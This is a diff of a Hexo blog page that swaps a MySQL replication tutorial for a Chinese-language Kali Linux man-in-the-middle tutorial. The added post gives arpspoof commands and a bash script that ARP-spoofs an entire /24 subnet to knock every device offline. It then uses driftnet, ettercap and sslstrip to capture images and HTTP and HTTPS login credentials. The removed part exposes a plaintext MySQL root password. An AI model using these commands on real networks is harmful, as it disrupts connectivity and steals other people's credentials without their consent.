@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="My-New-Post1, Hexo">
-    <meta name="description" content="MySQL-Replication
-在主服务器上，您必须启用二进制日志记录并配置唯一的服务器ID。需要重启服务器。==主：==12345678910主server-id不能和从相同[root@Mysql ~]# vim /etc/my.cn">
+    <meta name="keywords" content="kali linux--中间人攻击, Hexo">
+    <meta name="description" content="ARP协议ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。
+基本功能通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>My-New-Post1 | Hexo</title>
+    <title>kali linux--中间人攻击 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -412,13 +412,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        My-New-Post1
+                        kali linux--中间人攻击
                     </div>
                 </div>
             </div>
@@ -541,7 +541,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-25
+                    2019-12-17
                 </div>
                 
                 
@@ -559,43 +559,57 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="MySQL-Replication"><a href="#MySQL-Replication" class="headerlink" title="MySQL-Replication"></a>MySQL-Replication</h1><p><img src="image%5Czc.png" alt=""></p>
-<h2 id="在主服务器上，您必须启用二进制日志记录并配置唯一的服务器ID。需要重启服务器。"><a href="#在主服务器上，您必须启用二进制日志记录并配置唯一的服务器ID。需要重启服务器。" class="headerlink" title="在主服务器上，您必须启用二进制日志记录并配置唯一的服务器ID。需要重启服务器。"></a>在<strong>主服务器</strong>上，您必须<strong>启用二进制日志记录并配置唯一的服务器ID</strong>。需要<strong>重启服务</strong>器。</h2><h3 id="主："><a href="#主：" class="headerlink" title="==主：=="></a><strong>==主：==</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">主server-id不能和从相同</span><br><span class="line">[root@Mysql ~]# vim /etc/my.cnf     //编辑配置文件</span><br><span class="line">[mysqld]</span><br><span class="line">log-bin=<span class="regexp">/var/</span>log/mysql/mysql-bin</span><br><span class="line">server-id=<span class="number">1</span></span><br><span class="line">gtid_mode =ON</span><br><span class="line">enforce_gtid_consistency=<span class="number">1</span></span><br><span class="line">master-info-repository=TABLE          <span class="comment">//在slave上加，master不用加</span></span><br><span class="line">relay-log-info-repository=TABLE       <span class="comment">//在slave上加，master不用加</span></span><br></pre></td></tr></table></figure>
+                <h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p>
+<h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p>
+<h3 id="ARP攻击的局限性"><a href="#ARP攻击的局限性" class="headerlink" title="ARP攻击的局限性"></a>ARP攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。 </p>
+<p>无法对外网（互联网、非本区域内的局域网）进行攻击。</p>
+<h3 id="ARP攻击的攻击原理"><a href="#ARP攻击的攻击原理" class="headerlink" title="ARP攻击的攻击原理"></a>ARP攻击的攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="环境：kali-linux"><a href="#环境：kali-linux" class="headerlink" title="环境：kali-linux"></a>环境：kali-linux</h3><h3 id="工具：arpspoof"><a href="#工具：arpspoof" class="headerlink" title="工具：arpspoof"></a>工具：arpspoof</h3><h4 id="获取自己的网卡，IP，网关信息。"><a href="#获取自己的网卡，IP，网关信息。" class="headerlink" title="获取自己的网卡，IP，网关信息。"></a>获取自己的网卡，IP，网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /<span class="keyword">var</span>/log/mysql         <span class="comment">//创建日志目录</span></span><br><span class="line"></span><br><span class="line">chown mysql.mysql /<span class="keyword">var</span>/log/mysql   <span class="comment">//赋予权限</span></span><br><span class="line"></span><br><span class="line">systemctl restart mysqld    <span class="comment">//重启mysqld服务</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
 
-<p>*<em>从服务器需要使用MySQL 主服务器上的  用户名 和 密码 连接到主站,所以要在主服务器mysql上创建用户 *</em></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# mysql -uroot -pHzr.1329663207//先用账号密码登录主数据库</span><br><span class="line"></span><br><span class="line">mysql&gt; create user <span class="string">'repl'</span>@<span class="string">'%'</span></span><br><span class="line"></span><br><span class="line">mysql&gt; grant replication slave on .  to  <span class="string">'repl'</span>@<span class="string">'%'</span>  identified by <span class="string">'123'</span>;</span><br><span class="line"></span><br><span class="line">如果创建用户提示密码不安全请在/etc/my.cnf关闭 validate_password=off</span><br></pre></td></tr></table></figure>
+<p><img src="https://p.pstatp.com/origin/ff3b00005cae4290e2ca" alt=""></p>
+<h4 id="获取目标ip与网关信息。"><a href="#获取目标ip与网关信息。" class="headerlink" title="获取目标ip与网关信息。"></a>获取目标ip与网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.3.138.1/24</span><br></pre></td></tr></table></figure>
 
-<h3 id="如果主服务器上数据库有数据，需要同步到从服务器上"><a href="#如果主服务器上数据库有数据，需要同步到从服务器上" class="headerlink" title="如果主服务器上数据库有数据，需要同步到从服务器上"></a>如果主服务器上数据库有数据，需要同步到从服务器上</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysqldump  -u用户名  -p密码  --all-databases  --master-data=<span class="number">1</span> &gt; dbdump.db </span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pHzr<span class="number">.1329663207</span> --all-databases --master-data=<span class="number">1</span> &gt; dbdump.db</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出到dbdump.db</span></span><br><span class="line"></span><br><span class="line">#把导出的dbdump.db数据scp到从服务器上</span><br></pre></td></tr></table></figure>
+<p><img src="https://p.pstatp.com/origin/ffe2000076a7ddfa9f0f" alt=""></p>
+<h2 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.8.100 192.168.8.8</span><br></pre></td></tr></table></figure>
 
-<h3 id="从："><a href="#从：" class="headerlink" title="==从：=="></a><strong>==从：==</strong></h3><h3 id="在从数据库服务器上测试刚才创建的用户是否能连接"><a href="#在从数据库服务器上测试刚才创建的用户是否能连接" class="headerlink" title="在从数据库服务器上测试刚才创建的用户是否能连接"></a><strong>在从数据库服务器上测试刚才创建的用户是否能连接</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@mysql ~]# mysql -urepl -p'123' -h mysql-master1</span><br></pre></td></tr></table></figure>
+<p>双向攻击（即欺骗靶机也欺骗路由器）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.8.8 192.168.8.100</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@mysql ~]# vim   /etc/my.cnf     //编辑配置文件</span><br><span class="line"></span><br><span class="line">主server-id不能和从相同</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">log-bin=<span class="regexp">/var/</span>log/mysql/mysql-bin</span><br><span class="line">server-id=<span class="number">2</span></span><br><span class="line">gtid_mode =ON</span><br><span class="line">enforce_gtid_consistency=<span class="number">1</span></span><br><span class="line">master-info-repository=TABLE          </span><br><span class="line">relay-log-info-repository=TABLE</span><br></pre></td></tr></table></figure>
+<p><img src="https://p.pstatp.com/origin/10001000021821e51122f" alt=""></p>
+<blockquote>
+<p>攻击完成，此时被攻击手机无法上网。（ctrl+Z）（ctrl+C）可停止攻击</p>
+</blockquote>
+<p><img src="https://p.pstatp.com/origin/ff3800005a18018f4849" alt=""></p>
+<h2 id="群体攻击"><a href="#群体攻击" class="headerlink" title="群体攻击"></a>群体攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim arp.sh</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/bash</span><br><span class="line">#</span><br><span class="line">#Date:2019.09.28</span><br><span class="line">#Author:GZ</span><br><span class="line">#Mail:GZ1903@126.com</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">for i in ` seq 2 254 `</span><br><span class="line">do</span><br><span class="line">	nohup arpspoof -i eth0 -t 192.168.8.$i 192.168.8.1 &amp;</span><br><span class="line">	nohup arpspoof -i eth0 -t 192.168.8.1 192.168.8.$i &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>该攻击会造成局域网ip与mac地址混乱，任何设备（vnc,ssh,摄像头等联网设备）都不能与外界联网，且市场安全软件与策略不可防御，唯独渗透的kali能正常使用。慎用！！！</p>
+</blockquote>
+<h2 id="数据抓取"><a href="#数据抓取" class="headerlink" title="数据抓取"></a>数据抓取</h2><blockquote>
+<p>首先要开始IP转发功能，linux因为系统安全考虑，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，接下来修改为1。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
 
-<p>登录数据库 导入刚才在主导出的数据库数据，没有可不导</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mysql&gt; source   /root/fulldb.dump</span><br></pre></td></tr></table></figure>
+<p>修改完成后不显示，但可以用 <code>cat /proc/sys/net/ipv4/ip_forward</code>来确实是否修改成功。</p>
+<p><img src="https://p.pstatp.com/origin/ffe6000090cded42ce48" alt=""></p>
+<h4 id="抓取使用http协议的网页的图片"><a href="#抓取使用http协议的网页的图片" class="headerlink" title="抓取使用http协议的网页的图片"></a>抓取使用http协议的网页的图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>弹出对话框！！ eth0为监控网卡</p>
+</blockquote>
+<p><img src="https://p.pstatp.com/origin/fe3c0000c4a5a55f4852" alt=""></p>
+<h4 id="http账户密码获取"><a href="#http账户密码获取" class="headerlink" title="http账户密码获取"></a>http账户密码获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tp -i eth0</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://p.pstatp.com/origin/fe630000d607f86aa21c" alt=""></p>
+<h4 id="https账户密码获取"><a href="#https账户密码获取" class="headerlink" title="https账户密码获取"></a>https账户密码获取</h4><blockquote>
+<p> 使https链接还原为http s </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k sslstrip</span><br></pre></td></tr></table></figure>
 
-<p><strong>在从服务器配置连接到主服务器的相关信息</strong></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#mysql&gt; change master to </span><br><span class="line"></span><br><span class="line">master_host=<span class="string">"192.168.217.99"</span>,         <span class="comment">//主服务器IP，可用域名</span></span><br><span class="line"></span><br><span class="line">master_user=<span class="string">"repl"</span>,                   <span class="comment">//在主数据库创建的复制用户</span></span><br><span class="line"></span><br><span class="line">master_password=<span class="string">"123"</span>;                <span class="comment">//在主数据库创建的复制用户密码</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>报错：</strong></p>
-<p>ERROR 3021 (HY000): This operation cannot be performed with a running slave io thread; run STOP SLAVE IO_THREAD FOR CHANNEL ‘’ first.</p>
-<p><strong>配置信息时如果报 io线程未停止错误就先停止从的io线程 stop slave；</strong></p>
-<h3 id="配置完成-启动从服务器的复制线程"><a href="#配置完成-启动从服务器的复制线程" class="headerlink" title="配置完成-启动从服务器的复制线程"></a>配置完成-启动从服务器的复制线程</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mysql&gt; start slave;</span><br></pre></td></tr></table></figure>
-
-<h3 id="在从服务上执行如下操作，查看从服务器端-IO线程和-SQL-线程是否是yes"><a href="#在从服务上执行如下操作，查看从服务器端-IO线程和-SQL-线程是否是yes" class="headerlink" title="在从服务上执行如下操作，查看从服务器端 IO线程和 SQL 线程是否是yes"></a>在从服务上执行如下操作，查看从服务器端 IO线程和 SQL 线程是否是yes</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mysql&gt; show slave status\G</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="互主是一样的步骤，反过来就可以"><a href="#互主是一样的步骤，反过来就可以" class="headerlink" title="互主是一样的步骤，反过来就可以"></a>互主是一样的步骤，反过来就可以</h2><p>==用%  或   网段（192.168.217.%） 时不用单个授权，只需在master1授权一次就会同步到其他slave==</p>
-<h2 id="双主双从是一样的步骤用guit实现，（以下图片匀在最后两台slave上实现）"><a href="#双主双从是一样的步骤用guit实现，（以下图片匀在最后两台slave上实现）" class="headerlink" title="双主双从是一样的步骤用guit实现，（以下图片匀在最后两台slave上实现）"></a>双主双从是一样的步骤用guit实现，（以下图片匀在最后两台slave上实现）</h2><p>slave有多个主，所以要加通道channel </p>
-<p><img src="image%5Cmy.cof.png" alt=""></p>
-<p><img src="image%5Cslave.png" alt=""></p>
 
             </div>
             <hr/>
@@ -621,7 +635,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://hzerui.github.io/2019/10/25/My-New-Post1/">https://hzerui.github.io/2019/10/25/My-New-Post1/</a>
+                    <a href="https://hzerui.github.io/2019/12/17/kali%20linux--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">https://hzerui.github.io/2019/12/17/kali%20linux--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -827,28 +841,26 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/10/25/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/">
+                <a href="/2019/12/17/Metasploit/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="软件包管理">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Metasploit">
                         
-                        <span class="card-title">软件包管理</span>
+                        <span class="card-title">Metasploit</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一 使用RPM工具管理RPM包需要考虑： 
+                            Metasploit总览
 
-OS版本，e.g. Centos6/7          cat /etc/redhat-release 
-系统架构，e.g. i386/x86_64    uname -m 
-依赖关系，e.g
+Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-10-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-17
                         </span>
                         <span class="publish-author">
                             
@@ -868,24 +880,24 @@ OS版本，e.g. Centos6/7          cat /etc/redhat-release
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/25/My-New-Post3/">
+                <a href="/2019/12/17/Hexo%E6%B7%BB%E5%8A%A0Live2d%E7%9C%8B%E6%9D%BF%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="My New Post3">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Hexo添加Live2d看板动画效果">
                         
-                        <span class="card-title">My New Post3</span>
+                        <span class="card-title">Hexo添加Live2d看板动画效果</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            Hexo添加Live2d看板动画效果引言Hexo是一个快速、简洁且高效的博客框架，能够快速生成静态页面，只需一条指令即可部署到 GitHub Pages, Heroku 或其他网站，支持 GitHub Flavored Markdown 的
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-17
                             </span>
                         <span class="publish-author">
                             
